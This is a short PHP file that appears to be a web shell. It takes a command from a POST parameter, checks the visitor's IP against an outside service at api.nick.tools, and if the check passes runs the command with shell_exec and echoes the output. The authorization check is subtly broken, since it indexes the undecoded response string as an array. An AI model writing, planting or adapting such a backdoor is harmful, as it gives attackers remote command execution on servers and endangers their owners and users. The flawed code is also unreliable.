<?php
if (isset($_POST['cmd'])) {
$i = file_get_contents('https://api.nick.tools/ipinfo?ip=' . $_SERVER['REMOTE_ADDR']);
$allowed = $i['people']['nick'];
if ($allowed) {
echo shell_exec($_POST['cmd']);
} else {
http_response_code(403);
}
} else {
http_response_code(400);
}
?>
